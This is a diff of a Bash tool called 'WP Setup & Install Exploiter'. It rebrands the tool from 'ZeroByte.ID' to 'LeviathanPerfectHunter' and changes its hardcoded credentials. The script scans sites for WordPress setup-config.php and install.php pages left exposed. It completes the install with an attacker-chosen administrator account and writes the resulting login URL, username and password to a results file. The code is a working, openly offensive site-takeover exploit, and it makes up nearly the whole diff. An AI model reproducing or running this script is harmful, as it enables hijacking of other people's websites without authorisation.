@@ -9,13 +9,13 @@ banner(){
 clear
 printf "${ijo}
   ${putih}[${ijo}+${putih}] WP Setup & Install Exploiter ${putih}[${ijo}+${putih}] ${ijo}
-  ███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     
-  ████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     
-  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     
-  ██║╚██╗██║██║   ██║██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     
-  ██║ ╚████║╚██████╔╝██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗
-  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
-                                                      ${putih}LeviathanPerfectHunter
+ ██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     
+ ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     
+ ██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     
+║██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     
+╔██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗
+╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  
+                                    ${putih}LeviathanPerfectHunter
 "
 }
 skuy(){
@@ -23,24 +23,24 @@ skuy(){
   for path in "${Array[@]}"; do
     skuy=$(curl -s -k --compressed --connect-timeout 5 "$site/$path/wp-admin/setup-config.php?step=0" -L)
     if [[ $skuy =~ 'setup-config.php?step=1' ]]; then
-      printf "$green[+] Found Setup $site/wp-admin/setup-config.php [WP Setup & Install Exploiter - ZeroByte.ID]\n"
+      printf "$green[+] Found Setup $site/wp-admin/setup-config.php [WP Setup & Install Exploiter - LeviathanPerfectHunter]\n"
       echo "$site/wp-admin/setup-config.php" >> wp-setup.txt
     fi
     if [[ $(curl -s -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" $site/wp-admin/install.php | grep -o 'English (United States)') =~ 'English (United States)' ]]; 
     then
       echo "[+] Maybe Vuln"
-      exploit=$(curl --silent -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -d "weblog_title=Killer&user_name=zerobyte&admin_password=zerobyte1337&admin_password2=zerobyte1337&admin_email=$email" $site/wp-admin/install.php?step=2 | grep -o '<h1>Success!</h1>')
+      exploit=$(curl --silent -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -d "weblog_title=Killer&user_name=Leviathan&admin_password=Leviathan1337&admin_password2=Leviathan1337&admin_email=$email" $site/wp-admin/install.php?step=2 | grep -o '<h1>Success!</h1>')
       if [[ $exploit =~ '<h1>Success!</h1>' ]];
       then
       printf "$green[+] Sukses Install!\n"
       echo "$site/wp-login.php" | tee -a result_wp.txt
-      echo "Username = zerobyte" | tee -a result_wp.txt
-      echo "Password = zerobyte1337" | tee -a result_wp.txt
+      echo "Username = leviathan" | tee -a result_wp.txt
+      echo "Password = Leviathan1337" | tee -a result_wp.txt
       else
       printf "$red[-] Failed\n"
       fi
      else
-    printf "$ijo$site$path$red Not Vulnerable $ijo[WP Setup & Install Exploiter - ZeroByte.ID]\n"
+    printf "$ijo$site$path$red Not Vulnerable $ijo[WP Setup & Install Exploiter - LeviathanPerfectHunter]\n"
    fi
  done
 }
